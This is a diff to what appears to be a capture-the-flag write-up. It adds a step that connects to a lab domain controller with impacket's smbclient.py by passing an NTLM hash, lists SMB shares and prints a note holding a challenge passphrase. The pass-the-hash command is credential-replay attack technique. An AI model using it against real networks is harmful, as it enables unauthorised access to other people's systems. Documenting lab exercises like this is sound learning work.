@@ -915,7 +915,42 @@ Output
 
 ```
 
- 
+ Let's connect to the domain controller with smbclient, it's the only computer in this domain so must be our fileshare
+
+```bash
+smbclient.py wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
+```
+
+Hmm.. not what I am looking for for this objective, but may be useful later. 
+
+```
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+# use FileShare
+# ls
+drw-rw-rw-          0  Tue Dec 12 02:14:08 2023 .
+drw-rw-rw-          0  Tue Dec 12 02:14:05 2023 ..
+-rw-rw-rw-     701028  Tue Dec 12 02:14:08 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Tue Dec 12 02:14:08 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Tue Dec 12 02:14:08 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Tue Dec 12 02:14:08 2023 super_secret_research
+-rw-rw-rw-        165  Tue Dec 12 02:14:08 2023 todo.txt
+# cat InstructionsForEnteringSatelliteGroundStation.txt
+Note to self:
+
+To enter the Satellite Ground Station (SGS), say the following into the speaker:
+
+And he whispered, 'Now I shall be out of sight;
+So through the valley and over the height.'
+And he'll silently take his way.
+
+```
 
 
 
